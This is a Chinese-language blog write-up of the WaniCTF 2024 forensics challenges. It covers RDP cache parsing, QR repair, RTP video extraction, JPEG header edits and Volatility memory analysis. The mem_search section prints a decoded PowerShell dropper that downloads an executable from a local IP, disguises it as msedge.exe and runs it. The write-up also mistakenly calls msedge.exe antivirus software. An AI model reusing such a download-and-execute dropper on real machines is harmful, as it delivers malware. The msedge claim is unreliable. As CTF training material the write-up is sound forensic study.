---
title: "WaniCTF 2024 EICS1 Forensics wp"
date: 2024-06-25 13:37
updated: 2024-06-25 13:37
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
  - "Forensics"
description: "还不错，一个人打的取证几乎AK了 Forensics tiny_usb Surveillance_of_sus codebreaker I_wanna_be_a_streamer tiny_10px mem_search Forensics tiny_usb 简单题，AXIOM直接看就行 FLAG{"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18265870"
---
还不错，一个人打的取证几乎AK了

**[Forensics](https://www.cnblogs.com/LAMENTXU#1)**

-   [tiny\_usb](https://www.cnblogs.com/LAMENTXU#1.1)
-   [Surveillance\_of\_sus](https://www.cnblogs.com/LAMENTXU#1.2)
-   [codebreaker](https://www.cnblogs.com/LAMENTXU#1.3)
-   [I\_wanna\_be\_a\_streamer](https://www.cnblogs.com/LAMENTXU#1.4)
-   [tiny\_10px](https://www.cnblogs.com/LAMENTXU#1.5)
-   [mem\_search](https://www.cnblogs.com/LAMENTXU#1.6)

# Forensics

## tiny\_usb

简单题，AXIOM直接看就行

![](/images/migrated/18265870/01.png)

**FLAG{hey\_i\_just\_bought\_a\_usb}**

## Surveillance\_of\_sus

010Editor打开，注意到为RDP的缓存文件

![](/images/migrated/18265870/02.png)

我们使用工具对.bin文件进行解析，这里使用bmc-tools.py工具: [https://github.com/ANSSI-FR/bmc-tools](https://github.com/ANSSI-FR/bmc-tools)

解析出来一坨.bmp文件，提取与flag相关的文件，发现是个拼图

![](/images/migrated/18265870/03.png)

bmp拼接，肉眼瞪出flag

![](/images/migrated/18265870/04.jpg)

注意这个是yipeee（这个y坑了我好久）

**FLAG{RDP\_is\_useful\_yipeee}**

## codebreaker

题目图片：

![](/images/migrated/18265870/05.png)

最累的一集，直接qrazybox手搓二维码

![](/images/migrated/18265870/06.png)

然后看Reed-Solomon Decoder结束

![](/images/migrated/18265870/07.png)

**FLAG{How\_scan-dalous}**

## I\_wanna\_be\_a\_streamer

Wireshark分析，发现是H-264编码的视频流

![](/images/migrated/18265870/08.png)

先解码RTP包，然后wireshark下插件秒了

![](/images/migrated/18265870/09.png)

最后分解出.264格式的视频，直接下载MilkPlayer播放

![](/images/migrated/18265870/10.jpg)

**FLAG{Th4nk\_y0u\_f0r\_W4tching}**

好题，尤其是最后的FLAG很有感觉

## tiny\_10px

![](/images/migrated/18265870/11.png)

根据如上原理更改图片大小即可（学到了）

下载图片拖到cybershef里

![](/images/migrated/18265870/12.png)

慢慢改吧，最后改出来一个合适的值(改成ff c0 00 11 08 00 a0 00 a0)

![](/images/migrated/18265870/13.png)

**FLAG{b1g\_en0ugh}**

## mem\_search

用AXIOM找半天找不着不知道为啥

没办法了，只能上最硬核的vol3来内存取证了

老规矩先看info.Info

```
python vol.py -f chal_mem_search.DUMP windows.info
```

输出

```
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0xf8030e400000
DTB     0x1ad000
Symbols file:///C:/Users/LamentXU/Desktop/WEBCTF/FOR/volatility3-2.7.0/volatility3/symbols/windows/ntkrnlmp.pdb/D9424FC4861E47C10FAD1B35DEC6DCC8-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 WindowsCrashDump64Layer
base_layer      2 FileLayer
KdDebuggerDataBlock     0xf8030f000b20
NTBuildLab      19041.1.amd64fre.vb_release.1912
CSDVersion      0
KdVersionBlock  0xf8030f00f400
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      1
SystemTime      2024-05-11 09:33:57
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Mon Dec  9 11:07:51 2019
```

由于题目基本没啥提示，只给了一个unknown file说明是文件相关，那就只能把所有文件都dump出来看看了

```
python vol.py -f chal_mem_search.DUMP windows.filescan
```

输出一坨文件，一个一个看能看到有_read\_this\_as\_admin.lnknload_以及_read\_this\_as\_admin.download_

（其实这里是我先用AXIOM看过了有这两个东西，但是不知道为啥AXIOM分离的时候出了点问题分不出来。像这种大量文件的还是用AXIOM好毕竟人家有分类功能，像这种硬找的还是挺难的）

分离

```
python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebae1c0
python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebc26c0
```

![](/images/migrated/18265870/14.png)

能看到powershell，注意到有base64编码后的内容，对其进行解码

![](/images/migrated/18265870/15.png)

整理得：

```
$u='http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ%3D%3D/chall_mem_search.exe';
$t='WaniTemp';
mkdir -force $env:TMP\..\$t;
try{
    iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;
}catch{
}
```

msedge.exe为windows的杀毒软件，这里这个powershell脚本将恶意软件下载后存到了\\msedge.exe里

可以直接看chall\_mem\_search.exe

```
python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebd4af0
```

但是有这个必要吗？

注意到网址中B64\_decode\_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ

直接将RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ用base64解码得FLAG{Dayum\_this\_is\_secret\_file}

补充：比赛结束后看别的大佬wp发现这题还有个假flag

直接dumpfiles出chall\_mem\_search.exe拖进IDA里逆向，注意到：

```
int32_t sub_461730()
{
    int32_t __saved_ebp;
    __builtin_memset(&__saved_ebp, 0xcccccccc, 0);
    j_sub_4617b0(&data_46c012);
    MessageBoxW(nullptr, u"B64 decode this!!! RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ", u"Wani Hackase", MB_OK);
    j___RTC_CheckEsp();
    j___RTC_CheckEsp();
    return 0;
}
```

将RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ用base64解码即为假flag:FLAG{Hacked\_yikes\_spooky}

**FLAG{Dayum\_this\_is\_secret\_file}**
